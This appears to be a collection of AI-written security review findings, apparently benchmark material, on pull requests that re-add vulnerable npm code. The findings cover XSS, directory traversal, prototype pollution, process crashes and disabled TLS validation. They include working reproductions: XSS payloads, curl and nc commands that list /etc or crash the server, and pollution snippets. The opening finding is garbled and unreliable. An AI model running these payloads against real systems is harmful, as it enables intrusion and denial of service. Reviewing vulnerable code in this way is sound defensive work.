findings.body: RegExp values are emitted into the generated source with `thing.toString()` (`src/index.ts:104` and the shared-node path at `src/index.ts:156`), which does not escape `<` or `>`. Any pattern whose source contains `` inside a character class survives verbatim, so the serialized payload can close the surrounding `]')) // => /[]/ devalue({ q: new RegExp('') }) // => {q:/<\/script>/} // escaped only because '/' is outside a class ``` V8's `RegExp.prototype.source` escapes `/` only where it would end the literal, not inside `[...]`, so the first payload reaches the output as literal `` and terminates the script element. Embedded as `]/};` the browser parses the rest as HTML and runs `onerror`. **Impact:** script execution in the page that loads the state (medium: an attacker who controls the pattern string, e.g. through a URL-carried filter that is echoed into the state, runs JavaScript in any browser that renders it). Later upstream releases emit `new RegExp(, )` instead of `toString` and close this path. **Fix:** escape the source and flags as strings — e.g. `new RegExp(${stringifyString(thing.source)}${flags ? ',' + stringifyString(flags) : ''})` — rather than interpolating `thing.toString()`.

findings.title: Own __proto__ keys set the deserialized object's prototype and are dropped
findings.body:
Object keys are emitted either bare (`{__proto__:…}`, `src/index.ts:119` via
`safeKey`, `src/index.ts:232-234`) or as an assignment (`a.__proto__=…`,
`src/index.ts:183` via `safeProp`, `src/index.ts:236-238`). Both forms are the
special `__proto__` setter in JavaScript, so an own `__proto__` data property —
the normal result of `JSON.parse` on request body — is not reproduced: the key is
dropped and the deserialized object's prototype is replaced by the attacker's value.

**Evidence:**

```js
const state = JSON.parse('{"__proto__":{"isAdmin":true},"a":1}');
devalue(state)              // => {__proto__:{isAdmin:true},a:1}
eval('(' + devalue(state) + ')')
// => own keys ['a'], out.isAdmin === true, prototype is {isAdmin:true}

const q = JSON.parse('{"__proto__":{"isAdmin":true}}');
devalue({ x: q, y: q })     // => (function(a){a.__proto__={isAdmin:true};return {x:a,y:a}}({}))
// eval => Object.keys(out.x) is [], out.x.isAdmin is true
```

**Impact:** the serialized key is lost (broken round-trip) and attacker-chosen
inherited properties appear on the state object, so guards such as
`if (state.user.isAdmin)` or `key in state` can be satisfied without an own
property. Low: only the deserialized client-side object is affected, and shallow
(no `Object.prototype` pollution of the realm).

**Fix:** emit `__proto__` as a computed own property
(`{["__proto__"]:…}` / `name[["__proto__"]]=…`) or reject objects that have an own
`__proto__` key; later upstream releases throw `Cannot stringify objects with
__proto__ keys`.

findings.title: Symbol primitives are emitted as raw Symbol(description) source
findings.body:
`walk` rejects functions and non-POJOs (`src/index.ts:24-26`, `src/index.ts:63-68`)
but lets `Symbol` primitives through, and `stringifyPrimitive` emits them through
`String(thing)` (`src/index.ts:215`). `String(Symbol('x'))` is the text
`Symbol(x)`, which is inserted into the generated source unescaped.

**Preconditions:** state holds a symbol whose description derives from untrusted
input (`Symbol(userInput)`), or a symbol reachable through such an object.

**Evidence:**

```js
devalue([Symbol('),alert(1')])          // => [Symbol(),alert(1)]
const s = Symbol('),alert(1');
devalue([s, s])                         // => (function(a){return [a,a]}(Symbol(),alert(1)))
```

Evaluating the output runs `alert(1)`; any expression can be substituted for the
description. Repeated symbols take the named path at `src/index.ts:143-148` and
inject through the argument list instead, so both branches are affected.

**Impact:** arbitrary JavaScript in the page that evaluates the payload — the
failure mode the library promises to prevent. Low, because it needs an application
that builds symbols from user data; later upstream releases reject symbols with
`Cannot stringify a Symbol primitive`.

**Fix:** reject `typeof thing === 'symbol'` next to the function check in `walk`
(or emit `Symbol(<escaped description>)` with `stringifyString` for the
description).

findings.title: Committed test suite fails: Dangerous key expectation not updated
findings.body:
`npm test` fails on the committed test suite after this change: 44 passing,
1 failing.

**Evidence:**

```
1) devalue XSS Dangerous key:
   '{"\u003Csvg onload=alert(\"xss_works\")\u003E":"bar"}' ==
   '{"\\u003Csvg onload=alert(\"xss_works\")\\u003E":"bar"}'
```

`test/test.ts:91-95` still asserts the double-escaped output produced by the buggy
`safeKey` (`JSON.stringify(escapeUnsafeChars(key))`). The new `src/index.ts:233`
produces single-escaped `{"\u003Csvg …":"bar"}`, which is the correct value — the
test expectation is what is stale. Upstream updated this line in the same commit
that changed `safeKey` (`'{"\\\\u003C…'` → `'{"\\u003C…'`).

**Impact:** the branch does not pass its own test suite, so the correctness of the
double-escaping fix is not verified and CI stays red (low).

**Fix:** update the expected string in `test/test.ts:94` to
`'{"\\u003Csvg onload=alert(\\"xss_works\\")\\u003E":"bar"}'` (and rely on it to
pin the single-escaping behaviour).

summary:
The PR adds a single new file, `simplehttpserver/simplehttpserver.js` — a 158-line Express static file server whose catch-all handler builds directory listings. It is the pre-fix 0.1.1 version of the npm package, so it carries the CVE-2018-16478 traversal, plus error paths that end the process.

I ran the file with its own pinned dependencies (express 4.13.4, send 0.13.2) against a scratch web root and reproduced each reported issue with raw HTTP requests. The main problems: `path.join()` resolves `..` without a containment check, so anyone can list any directory on the host (including `/etc`, `/root`, `/proc`); and three separate unhandled-error paths — a `GET *` request, `send(res, ...)`, and a failed `stat` in the listing worker — each terminate the node process from a single unauthenticated request. The containment check upstream 0.2.1 adds is exactly the missing guard, which corroborates the intended invariant. A browser will not send the needed `..` or `*` forms, so the traversal and crash require a direct HTTP client, not a victim's browser.

findings.title: Unauthenticated callers can list any directory on the host via .. paths
findings.body:
The catch-all handler resolves the request path against the server root with `path.join()`, which collapses `..` segments. Nothing checks that the result is still inside the served directory, so any client that sends a literal `..` in the request line gets a directory listing of any directory the process can read, e.g. `/etc/`, `/root/`, `/proc/`, or the parent of the web root. **Preconditions:** none beyond reach. The server binds `0.0.0.0:8000` by default (`simplehttpserver.js:25-26,146`) and has no authentication. The request must carry an un-normalised `..` segment, which a browser will not produce but any direct HTTP client can (`curl --path-as-is`, `nc`, a script). Percent-encoded forms (`%2e%2e%2f`, `..%2f`) return 404 because `url.parse().pathname` is not decoded; only literal `..` works. **Evidence:** reproduced against this file with its pinned dependencies (express 4.13.4, send 0.13.2) on Node 24: ``` $ curl -s --path-as-is "http://127.0.0.1:8123/../secret_notes/" HTTP/1.1 200 OK Directory listing for /../secret_notes/
  • passwords.txt
    • $ curl -s -o /dev/null -w "%{http_code}" --path-as-is "http://127.0.0.1:8123/../../../../../../etc/" 200 # 4532-byte listing of /etc ``` `/proc/`, `/sys/` and `/dev/` list the same way. `express.static()` at `simplehttpserver.js:44` is not the problem: it returns 403 for `..` paths, serve-static swallows that and calls `next()`, and the vulnerable handler at `simplehttpserver.js:57-83` runs. Upstream 0.2.1 added exactly the missing guard — an `..` segment check plus `path.relative(webroot, pathname)` starting with `..` — which confirms the intended invariant. **Impact:** an unauthenticated network actor obtains file and directory names plus a directory-existence oracle for the whole filesystem outside the served root: account names in `/home`, project and backup names, service layout, log file names. That crosses a trust boundary and cannot be undone, hence high. Scoped note: file *contents* outside the root are not readable in this build — a non-directory path returns 404 at `simplehttpserver.js:63`, and the `index.html` branch crashes the process instead (see the `send()` finding). **Fix:** restore the invariant that the resolved path stays under the root, before any `fs` call: reject request paths containing a `..` segment, and verify `path.relative(dir, pathname) !== '..' && !path.relative(dir, pathname).startsWith('..' + path.sep)`; return 404 otherwise. The same check must be applied to `indexpath`.

findings.title: A single GET * request crashes the server with an uncaught TypeError
findings.body:
A single unauthenticated request whose target is `*` (`GET * HTTP/1.1`) reaches the catch-all handler with a response object that lacks Express's response helpers, so `res.sendStatus` is undefined and the thrown `TypeError` is uncaught. The node process exits and the server stays down until it is restarted.

**Preconditions:** only network reach. No `..` path, no special file in the web root, and the request is not recorded by morgan (no `use` layer runs for this target form, so the kill leaves no access-log line).

**Evidence:** reproduced on this file with express 4.13.4:

```
$ printf 'GET * HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n' | nc 127.0.0.1 8125
(TypeError: res.sendStatus is not a function
    at /tmp/work/simplehttpserver/simplehttpserver.js:63:56
    at FSReqCallback.oncomplete (node:fs:197:21))
$ curl -o /dev/null -w '%{http_code}' http://127.0.0.1:8125/   # afterwards
000
```

Express's router does not run the `app.use()` layers (`morgan`, `query`, `expressInit`) for request targets that do not start with `/`, but it still dispatches `mainapp.get('*')`; `expressInit` is what installs the response prototype, so `res.sendStatus`, `res.status` and `res.set` are all missing. `OPTIONS *` does not crash but returns a 500 whose body includes an absolute-path stack trace.

**Impact:** remote, unauthenticated, repeatable process kill — every user of the server loses it until restart. Reach is broad and recovery is a restart, hence medium.

**Fix:** do not put the fallback in a wildcard route. Register it as `mainapp.use(function(req, res){ ... })` so Express's own middleware (and the response prototype) always runs first, and add an `error`/`uncaughtException` guard so an unexpected response state cannot end the process.

findings.title: send() is called with the response object, so serving an index.html kills the process
findings.body:
When the catch-all handler finds an `index.html` in the requested directory, it calls `send(res, indexpath)` — passing the response object where the `send` module expects the request. send then reads `req.headers.range` from the response, `res.headers` is undefined, and the `TypeError` is uncaught, so the process exits before any file is sent.

**Preconditions:** a traversed path (the `..` traversal above) that resolves to a directory outside the web root which contains a file named `index.html`. Directories inside the web root never reach this branch because `express.static()` serves their `index.html` first.

**Evidence:** reproduced with this file's pinned send 0.13.2. With `outsideidx/index.html` next to the web root:

```
$ curl -s --path-as-is "http://127.0.0.1:8123/../outsideidx/"    # empty reply
$ tail simplehttpserver.log
TypeError: Cannot read properties of undefined (reading 'range')
    at SendStream.send (.../send/index.js:520:28)
    at onstat (.../send/index.js:624:10)
$ curl -o /dev/null -w '%{http_code}' http://127.0.0.1:8123/     # afterwards
000
```

`simplehttpserver.js:70`. Upstream master still carries the same call, so the branch has never served a file.

**Impact:** an unauthenticated request kills the server (outage until restart) instead of serving the index page. Reach is broad, but it needs an `index.html` outside the root that the attacker cannot create, so it is filed low rather than medium.

**Fix:** `send(req, indexpath, { root: dir }).pipe(res)` — pass the request, and let send handle classification, ranges and errors; or drop the branch and serve `index.html` through `express.static()`, which already does this correctly.

findings.title: A failed stat during a directory listing crashes the server
findings.body:
In the directory-listing worker, `if ( !stat ) cb();` has no `return`. When `fs.stat()` fails, execution continues to `stat.isDirectory()` on `undefined`, which throws inside the `fs.stat` callback. Nothing catches it, so the process exits and the in-flight listing never gets a response.

**Preconditions:** any entry in a listed directory whose `stat` fails: a dangling symlink, a file removed between `readdir()` and `stat()`, or a name whose bytes are not valid UTF-8 (`fs.readdir` decodes them to U+FFFD, so the stat of the re-encoded name fails with ENOENT). Folders unpacked from archives or written by another service commonly contain such names.

**Evidence:** reproduced with a dangling symlink in the web root:

```
$ ls -l root/crashdir
dangling.txt -> /nonexistent/target
$ curl -s --path-as-is "http://127.0.0.1:8123/crashdir/"   # empty reply
$ tail simplehttpserver.log
TypeError: Cannot read properties of undefined (reading 'isDirectory')
    at /tmp/work/simplehttpserver/simplehttpserver.js:128:22
$ curl -o /dev/null -w '%{http_code}' http://127.0.0.1:8123/   # afterwards
000
```

Also note `cb()` is then called twice (line 125 and line 133) if the throw were ever caught, which async rejects.

**Impact:** one request to a directory containing such an entry takes the whole server down until restart. Reach is broad, recovery is a restart, and the trigger depends on a filesystem state the attacker does not control, hence low.

**Fix:** `if (err || !stat) return cb();` — return on the error path, and decide how the entry should appear in the listing (skip it, or list it without a trailing slash).

findings.title: Directory listing links 404 for names that need URL encoding
findings.body:
The listing handler builds links with `querystring.escape(item)` but matches the incoming path with the undecoded `url.parse(req.url).pathname`, so the link the server prints for a directory whose name needs encoding returns 404 when clicked. **Evidence:** with a web root containing `my dir/`: ``` $ curl -s http://127.0.0.1:8126/ | grep 'my'
  • my dir/ $ curl -s -o /dev/null -w "%{http_code}" --path-as-is "http://127.0.0.1:8126/my%20dir/" 404 $ curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:8126/my%20dir/inner.txt" 200 ``` `simplehttpserver.js:58-59` passes the raw pathname to `path.join`, while `express.static()` at line 44 decodes it, so files inside such a directory are served but the directory itself can never be opened or listed. **Impact:** directory navigation is broken for any name containing a space, `#`, `?` or non-ASCII characters — contained and cosmetic, hence info. **Fix:** decode the pathname once (`decodeURIComponent` on a validated path) before both the containment check and `path.join`, and keep the traversal guard after decoding.

summary:
The PR re-adds `_read.js` and its only change of substance versus the shipped upstream file is the removal of `opts.rejectUnauthorized = false` (compare upstream `41468a2b`), i.e. it is the CVE-2018-1000096 remediation for the read path. I reproduced that the fix works: `tiny.get` against a self-signed HTTPS server now fails with `self-signed certificate`, where it previously parsed the impostor's JSON.

Overall the security intent is correct and the diff is minimal, but it is incomplete: `_write.js:38` still disables certificate validation, so `post`/`put`/`del` remain MITM-able (confirmed: POST succeeded against the same self-signed server). The newly added file also carries four defects I reproduced with local servers — a `TypeError` that discards the body of any successful response lacking `Content-Type`, silently dropped `data` params when the URL has a fragment, a permanently unsettled request when the response stream errors, and a double callback on non-2xx-then-request-error. All are low severity except the partial TLS fix, which I graded medium because the affected lines sit outside this diff.

findings.title: GET returns a TypeError instead of the body when the response has no Content-Type header
findings.body:
`tiny.get` returns an error for a successful response whose headers carry no
`Content-Type`. `_read.js:59` dereferences `res.headers['content-type']` without
checking it exists, so the read throws before the body is buffered. The `catch`
block turns that into the errback/rejection, and `result` is still `null`
(`_read.js:57`), so the caller loses both the body and the response headers'
context for a request that actually succeeded.

**Evidence:** local server replying `200` with body `{"hi":1}` and no
`Content-Type` header:

```
ERR: TypeError Cannot read properties of undefined (reading 'startsWith')
BODY: null
```

`_write.js:44-49` already guards this case with `headers['Content-Type'] &&
...`; the read path has no equivalent. A caller only sees a `TypeError` with no
status code or body, which is indistinguishable from a transport failure.

**Impact:** contained to the single request that hits a header-less response,
and recoverable (retry once the server sends a type, or the caller can pass
`buffer: true`). Every GET against such an endpoint fails, though — e.g.
servers that answer `204`/plain text without a type.

**Fix:** treat a missing header as non-JSON instead of throwing:

```js
var ct = res.headers['content-type'] || ''
var isJSON = ct.startsWith('application/json')
```

findings.title: TLS certificate validation stays disabled for post/put/del, so the CVE fix is only partial
findings.body:
`tiny.post`, `tiny.put` and `tiny.del` still accept any TLS certificate for any
hostname. This PR removes `opts.rejectUnauthorized = false` from the read path,
which closes CVE-2018-1000096 for GET, but `_write.js:38` keeps the same setting
for writes. An attacker able to intercept traffic (rogue Wi-Fi, ARP/DNS
spoofing, compromised proxy) can present their own certificate, terminate TLS,
and read or rewrite request bodies and credentials sent via the write methods.

**Preconditions:** the caller reaches the API over HTTPS through a path the
attacker can intercept; no CA-trust modification is needed because verification
is disabled outright.

**Evidence:** reproduced with a self-signed cert and the repository's own
`_write.js`:

```
GET  ->  err: self-signed certificate ...
POST ->  SUCCEEDED (bad)
```

The GET path now correctly rejects the certificate; the POST path, with
`opts.rejectUnauthorized = false` at `_write.js:38`, completes the request and
parses the impostor's JSON.

**Impact:** cross-trust-boundary exposure of request payloads and credentials
for three of the four public methods; the exchanged secrets are out permanently.
Graded `medium` rather than `high` because the affected lines are outside this
diff — the same defect class the PR is fixing, left in the sibling path — so
closing it is a follow-up change in `_write.js`, not a regression introduced
here.

**Fix:** delete `opts.rejectUnauthorized = false` from `_write.js` as well, so
all four methods inherit Node's default verification; add a stored-cert test if
callers need to opt out.

findings.title: Query params from options.data are dropped when the URL has a #fragment
findings.body:
Query parameters passed via `options.data` are silently dropped when the URL
contains a fragment. `_read.js:29` appends the serialized params to the raw URL
string, so for `http://host/x#frag` the result is `http://host/x#frag?a=1` and
`url.parse` (`_read.js:30`) treats `?a=1` as part of the hash. The request goes
out with no query string and no error is reported.

**Evidence:** local server logging `req.url` for
`tiny.get({url: 'http://localhost:PORT/x#frag', data: {a: 1}})`:

```
server saw url: /x
err: null
```

The caller gets a normal result for a request that asked for something else —
for example a filtered or paginated resource.

**Impact:** contained to the one call and recoverable, but the caller cannot
detect the drop from the result: a successful response for the wrong request.
Same pattern exists in `_write.js:34-36` for DELETE.

**Fix:** strip/ignore the hash before appending, or set the params on the parsed
URL object and re-format it:

```js
opts.hash = null
opts.search = opts.search ? opts.search + '&' + qs.stringify(options.data)
                        : '?' + qs.stringify(options.data)
```
or assert that `options.url` carries no fragment when `options.data` is set.

findings.title: A response stream error after the headers leaves the request permanently unsettled
findings.body:
If the response stream fails after headers arrive, the request never settles: the
promise neither resolves nor rejects and the callback is never called. `_read.js`
attaches only `'data'` and `'end'` listeners to `res` (lines 51-55) and only
`'error'` to `req` (line 74); Node reports a truncated body, aborted socket or
chunk-parsing failure on the response stream, not on the request. The library
also accepts no timeout option (lines 24-41 only read `url`, `data`, `headers`,
`buffer`), so the caller has no way to bound or cancel the wait.

**Evidence:** a server that answers `Content-Length: 100`, writes 6 bytes, then
destroys the socket:

```
read({url}).then(ok, fail)   // neither handler runs
```

The process exits with an unsettled promise, leaving the caller's handler (or
Lambda invocation) hanging while the socket stays open.

**Impact:** contained to the affected request and not attacker-controllable
beyond the server the caller chose to talk to, but the caller cannot recover,
so one misbehaving endpoint stalls a caller indefinitely.

**Fix:** fail the request when the response ends prematurely:

```js
res.on('error', callback)
res.on('aborted', function () { callback(Error('response aborted')) })
```
and guard against settling twice with a small `done()` wrapper.

findings.title: The callback fires twice when a non-2xx response is followed by a request error
findings.body:
The callback can run twice for one request. `_read.js:46` invokes the callback as
soon as a non-2xx status is seen, and `_read.js:74` also wires the same callback
to `req.on('error', ...)`. A later request-level error — for example a chunk
framing error in the error response body — calls it a second time.

**Evidence:** server replying `HTTP/1.1 500` with `Transfer-Encoding: chunked`
and a malformed chunk:

```
callback #1: GET failed with: 500
callback #2: Parse Error: Invalid character in chunk size
total callbacks: 2
```

**Impact:** a hostile or broken server triggers the caller's errback twice;
user code that records a failure, retries, or writes a record does it twice.
Promise mode hides it (a second settle is a no-op), but Node-style callers get
two invocations. Contained and recoverable.

**Fix:** settle exactly once — wrap the callback in a `done(err, result)` guard
and register that on both `req` and the early-error path.

summary:
Recorded one finding. Coverage note: I read the full 43-line addition (`lib/index.js`, the only changed file), traced its consumers (`shim.js` monkey-patches global `path.relative`; `test/index.js`), compared it against the published 1.0.1/1.0.2 artifacts and the upstream commit history (this PR is commit a43cffec, the CVE-2018-16472 fix; a later commit 40c73bf fixed the remainder), and reproduced the residual pollution and cache-collision behaviour locally on Node 24.

**Summary:** The PR re-adds `lib/index.js`, a memoizing wrapper around `path.relative` that seeds its cache with `Object.create(null)` and invalidates on cwd change. That fixes the headline CVE entry point, but the invalidation path and the second-level buckets still fall back to plain objects, so `from = '__proto__'` pollutes `Object.prototype` again after any `process.chdir()`, and inherited-name keys yield wrong cached values. The change is close to correct but needs the same prototype-less treatment on the two remaining cache allocations.

findings.title: Prototype pollution returns after the cwd-change cache reset
findings.body:
The prototype-pollution fix is incomplete: after the process changes its working
directory, the cache is reset to a plain object and the `__proto__` path becomes
writable again.

`lib/index.js:20` seeds the cache with `Object.create(null)`, but the cwd-change
invalidation at `lib/index.js:26` assigns `cache = {}`, and `lib/index.js:35` builds
each second-level bucket as a plain object too. With a normal object,
`cache['__proto__']` resolves to `Object.prototype` instead of missing, so
`lib/index.js:31` treats it as a cache hit and `lib/index.js:37` writes the
attacker-controlled second key onto `Object.prototype` for the whole process.

**Preconditions:** the host process has called `process.chdir()` at least once since
this module was loaded (common in CLIs, bundlers and test runners), and a caller
passes an attacker-influenced path as `from` — easy through the `path.relative`
shim in `shim.js`, which makes every caller a potential entry point.

**Evidence:** reproduced against this file on Node 24:

```js
var relative = require('./lib')
process.chdir('/tmp')            // lastCwd was the load-time cwd
console.log(({}).polluted)       // undefined
relative('__proto__', 'polluted')
console.log(({}).polluted)       // '../polluted'
```

The same root cause corrupts cache hits without any pollution: `relative('constructor','name')`
returns `'Object'` and a repeated `relative('a','__proto__')` returns
`[Object: null prototype] {}` instead of a path string, so callers silently get
non-path results (`lib/index.js:31`).

**Impact:** An attacker who controls a path argument can set arbitrary keys on
`Object.prototype` with a `path.relative`-derived string value, clobbering methods
such as `toString` and disrupting or denying service in the host process; it also
returns wrong cached values. The process-wide effect is bounded: values are always
strings, and a restart clears the pollution. That, plus the `chdir` precondition,
keeps this at medium rather than high.

**Fix:** keep prototype-less maps everywhere — use `Object.create(null)` for the
reset at `lib/index.js:26` and for the buckets at `lib/index.js:35`, the change
upstream later shipped in 40c73bf ("Fix other instances of prototype pollution
vulnerability").

summary:
Reviewed the diff: PR #2 re-adds `lib/index.js`, the memoizing wrapper around `path.relative` (43 lines, one reviewable file). I read the whole file, confirmed the shim and normal-case behavior match `path.relative`, and reproduced the cache-key issue with Node against the checked-out file.

The cache and its per-path buckets are plain objects keyed by caller-supplied strings, so `__proto__`/`constructor` arguments write onto `Object.prototype` instead of the cache, and inherited properties are returned as if they were cached paths. That is the prototype pollution this fixture is built around (CVE-2018-16472); I recorded it as one medium finding covering both the write and read paths, since a single fix addresses both. The rest of the change — cwd invalidation, cache lookup, the shim — looks correct; the only other quirk is that empty-string results are never cached, which is a performance detail rather than a defect.

findings.title: Untrusted path argument pollutes Object.prototype through the plain-object cache
findings.body:
`cachedPathRelative` derives its cache keys straight from its `from`/`to`
arguments, but the cache is a plain object (`var cache = {}`, lib/index.js:13, and
again on cwd change at lib/index.js:30). Any `from` value that names a property
inherited from `Object.prototype` — `__proto__`, `constructor`, `toString` —
resolves to the inherited value instead of a cache entry, so the write at
lib/index.js:38-39 mutates a shared object rather than the cache.

**Evidence:** run against `lib/index.js` as checked out:

```js
var relative = require('./lib')
relative('__proto__', 'polluted')     // returns '../polluted'
({}).polluted                          // '../polluted'  -> on Object.prototype
Object.keys(Object.prototype)          // ['polluted']   -> enumerable, leaks into for-in
relative('constructor', 'evil')        // then Object.evil === '../evil'
relative('__proto__', 'toString')      // returns a function, not a relative path
```

The first call takes the `cache[from] = cache[from] || {}` branch: `cache['__proto__']`
is `Object.prototype` (truthy), so no own entry is created and line 39 assigns onto
`Object.prototype`. The last line shows the same root cause on the read path: the
inherited value is returned as if it were a cached result, so callers get a non-string.
Upstream fixed this by making the cache and its per-`from` buckets null-prototype
objects (`Object.create(null)`).

**Impact:** An attacker who can put a crafted `from` argument in front of
`path.relative` — directly, through the `shim.js` global override, or through a
tool that resolves untrusted paths, as in the browserify use case this module targets
— sets an enumerable property on `Object.prototype` for the whole process. Every
`for...in` loop and inherited-property lookup then sees the injected key, which
breaks or hangs consumers. Reach is broad (all objects in the process) and the effect
is recoverable rather than permanent (in-memory only; a restart clears it, and any
caller can re-trigger it at will), so medium. NVD scores CVE-2018-16472 7.5 for the
same issue.

**Fix:** Make the cache and each per-`from` bucket prototype-free so caller-supplied
keys can never resolve to inherited properties — `cache = Object.create(null)` at
both initialization sites and `cache[from] = cache[from] || Object.create(null)` at
lib/index.js:38 — and, for the read side, only trust entries the module created
(`Object.prototype.hasOwnProperty.call(cache, from)`).

summary:
Findings recorded. Summary:

The PR re-adds `src/ui/input/checkbox_input.jsx`, the checkbox renderer used by `CustomInput` for `additionalSignUpFields` entries of type `checkbox`. It brings in the upstream revision that takes a caller-supplied `placeholderHTML` string and inserts it with `dangerouslySetInnerHTML` — the sink behind CVE-2019-20174 — though in this tree nothing wires that prop through (`custom_input.jsx:30-38`, `sign_up_pane.jsx:38-52`, and the option validator in `connection/database/index.js` all drop it). I also reproduced a real test failure: the new rendering no longer matches the committed `custom_input` snapshot (`npx jest src/__tests__/field/custom_input.test.jsx` fails). Both issues are recorded; the rest of the component (checked-state handling, `onChange` forwarding, id/aria wiring) matches existing input components and looks sound.

findings.title: CheckboxInput inserts caller-supplied placeholderHTML with dangerouslySetInnerHTML, enabling XSS
findings.body: `CheckboxInput` renders the `placeholderHTML` prop with `dangerouslySetInnerHTML` (src/ui/input/checkbox_input.jsx:17-19). Any HTML in that string runs in the Lock widget's origin, where an attacker can read the email/password typed into the form, call `parent.postMessage` with a forged result, or redirect the user. **Preconditions:** a caller must pass `placeholderHTML`. Nothing in this tree does: `custom_input.jsx:30-38` forwards only `placeholder`, `sign_up_pane.jsx:38-52` reads only `placeholder` from each `additionalSignUpFields` entry, and the option validator (src/connection/database/index.js:99-206) rebuilds each entry from a fixed field list, so an extra `placeholderHTML` key in the Lock configuration is dropped. The branch is therefore latent here and becomes reachable as soon as the caller wiring is added. **Evidence:** `dangerouslySetInnerHTML={{ __html: placeholderHTML }}` with no sanitizer on the branch, contrasted with the fallback at line 20-22 which renders `{placeholder}` as text. Upstream added this sink in auth0/lock#1788 and later sanitized every `dangerouslySetInnerHTML` use with DOMPurify (GHSA-jr3j-whm4-9wwm, the fix for CVE-2019-20174); no sanitizer is present in this copy. **Impact:** script execution inside the auth page — credential and token theft from users of any Lock instance that supplies HTML here. Reach crosses a trust boundary (the page is trusted with passwords); persistence is transient because the payload must be re-served on each page load, so the pair grades medium. It is filed at medium rather than high because the prop is not wired up in this tree today. **Fix:** render the label as a text node (`{placeholder}`) and drop the `placeholderHTML` branch, or pass the value through DOMPurify before inserting it.

findings.title: Checkbox label rendering no longer matches the committed custom_input snapshot, failing jest
findings.body: The added component changes how a checkbox field's label is rendered: it now emits `{placeholder}` as a text node when `placeholderHTML` is absent (src/ui/input/checkbox_input.jsx:17-22), while the committed snapshot for that case expects `` (src/__tests__/field/__snapshots__/custom_input.test.jsx.snap:3-27). With the change applied, `npx jest src/__tests__/field/custom_input.test.jsx` fails: `CustomInput › when type == checkbox › renders correctly as a CheckBoxInput`, 1 snapshot failed. The file this change restores corresponds to a later upstream revision whose accompanying snapshot update (auth0/lock#1788) is not part of this repository, so the component and the checked-in test disagree. **Evidence:** reproduction above; the failing assertion is at src/__tests__/field/custom_input.test.jsx:102. **Impact:** the test suite fails on the branch, hiding real regressions in the same run. Contained and recoverable — the snapshot can be updated — so low. **Fix:** update the committed snapshot (or restore the previous rendering) so the component and the test agree, and add a case that covers the `placeholderHTML` branch.

summary:
This PR adds `_read.js`, the `tiny.get` implementation wired into `index.js`, so GET is the whole changed surface; I read it against `_write.js` (the POST/PUT/DELETE path it mirrors) and the tests, and reproduced every issue below against local servers.

The headline problem is the CVE: line 35 forces `rejectUnauthorized = false`, so every HTTPS `tiny.get` skips certificate validation and an on-path attacker can read or forge responses. Beyond that, three smaller defects come from copying `_write.js`'s shortcuts into the read path: a crash on responses without `Content-Type`, query parameters dropped when the URL has a fragment, and lowercase caller headers overwritten by the library's defaults. All are recorded as findings with reproductions.

findings.title: tiny.get throws TypeError and drops the body when the response has no Content-Type
findings.body:
`tiny.get` fails whenever the response carries no `Content-Type` header. `_read.js:60`
reads `res.headers['content-type'].startsWith('application/json')` without checking that
the header exists. When it is absent the expression throws `TypeError: Cannot read
properties of undefined`, the surrounding `catch` turns that into `err`, and the caller
gets an error even though the request succeeded with a 2xx status.

**Evidence:** Reproduced with Node v24.22.2 against a plain `http` server that replies
`200` with body `hello` and no `Content-Type`: `_read` invoked its callback with
`TypeError: Cannot read properties of undefined (reading 'startsWith')` and
`{body: null, headers: {...}}`. 204 No Content responses and many minimal servers also
omit the header. `_write.js:46-50` avoids this with an `is()` helper that handles a
missing header, so GET regresses behaviour the rest of the library already gets right.

**Impact:** Reads against such endpoints always fail with a spurious error; the response
body is discarded. Contained to the affected request and recoverable by the caller, so
`low`.

**Fix:** Keep the JSON check but tolerate an absent header, e.g.
`var ct = res.headers['content-type'] || ''` and test `ct.startsWith('application/json')`
— or reuse the same `is()` helper `_write.js` uses.

findings.title: tiny.get accepts any TLS certificate, exposing HTTPS callers to man-in-the-middle
findings.body:
Every HTTP request made by `tiny.get` sets `opts.rejectUnauthorized = false`, which turns
off TLS certificate verification. A `tiny.get({url: 'https://...'})` call therefore
succeeds when the peer certificate is self-signed, expired, issued for a different host,
or presented by an attacker on the network path. Callers get no signal that the
connection was unauthenticated, so any HTTPS response can be read and rewritten in
transit.

**Preconditions:** the caller uses `tiny.get` against an `https:` URL, and an attacker can
intercept that connection (DNS spoofing, hostile Wi-Fi, proxy, BGP hijack).

**Evidence:** `_read.js:35` unconditionally disables verification. Reproduced with Node
v24.22.2: an `https` server with a self-signed certificate is reached successfully
through `_read({url: 'https://localhost:<port>/'})` — `err: null`, body
`{"secret":"intercepted-by-attacker"}` — while a plain `https.get` to the same port
fails with `DEPTH_ZERO_SELF_SIGNED_CERT`. The vulnerable option is the only difference;
upstream's fix for this (brianleroux/tiny-json-http#15) deletes exactly this line.

**Impact:** The library's core function is HTTPS JSON access, so its guarantee of server
identity is the trust boundary for every request it makes. An on-path attacker recovers
credentials, tokens, and response data sent with `tiny.get`, and can substitute forged
bodies. Exposure is permanent — nothing in the library records or undoes it. NVD rates
this CVE-2018-1000096 as CVSS 3.0 8.1 (HIGH, CWE-295: Missing Certificate Validation);
the `high` severity here follows that policy.

**Fix:** Restore the default invariant: the client must verify the server certificate
unless the caller explicitly opts out. Delete `opts.rejectUnauthorized = false` at
`_read.js:35`. If an opt-out is wanted, honour a caller-supplied
`options.rejectUnauthorized` instead of forcing `false`. Note `_write.js:38` has the same
line, so the POST/PUT/DELETE path needs the identical change.

findings.title: tiny.get never settles when the server aborts mid-response
findings.body:
If a server closes the connection mid-response (partial body, then reset), `tiny.get`'s
callback never fires and the returned promise never settles. `_read.js` registers
`req.on('error', callback)` (line 73) but no `res.on('error', ...)` handler. Node emits
the abort as an `error` event on the `IncomingMessage`, which no listener observes; the
`res.on('end')` handler that calls back never runs, so the request hangs forever — and
the library sets no request timeout, so nothing bounds it.

**Evidence:** Reproduced with Node v24.22.2: a server writes
`{'Content-Type':'application/json','Content-Length':'100'}`, sends `{"partial":`, and
destroys the socket 50 ms later. `_read({url}, cb)` fired no callback within 3 s; a raw
`http.get` on the same server emits `res` `error` `ECONNRESET`, which `_read` ignores.
`_write.js` shares the same structure, so this is not unique to the read path.

**Impact:** A caller that `await`s `tiny.get` against a flaky or hostile endpoint hangs
indefinitely instead of receiving an error; only process restart or an external timeout
clears it. One request, no data loss — `info`.

**Fix:** Attach the same callback to the response stream, e.g.
`res.on('error', callback)` next to the `req.on('error', callback)` registration, so any
response-stream failure settles the call once.

findings.title: Lowercase caller headers are overwritten by default User-Agent and Content-Type
findings.body:
Caller-supplied headers are silently replaced by defaults when written in lowercase.
